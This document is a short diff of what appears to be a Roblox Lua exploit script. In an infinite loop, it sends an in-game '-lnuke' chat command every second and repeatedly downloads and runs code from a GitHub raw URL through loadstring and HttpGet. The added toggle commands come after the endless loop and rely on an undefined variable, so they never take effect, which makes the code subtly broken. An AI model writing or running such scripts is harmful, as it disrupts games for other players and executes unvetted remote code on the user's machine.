@@ -1,7 +1,18 @@
+local lnukeloop = true
+if lnukeloop == true then
+
 while true do
-game.Players:Chat("gear me 00000000000000000000000000000000000000000292969139")
-wait(0.55)
+game.Players:Chat("-lnuke")
+wait(1)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/usetools",true))()
 
 end
+end
+if msg == "looplnuke" then
+lnukeloop = true
+end
+if msg == "unlooplnuke" then
+lnukeloop = false
+end
+
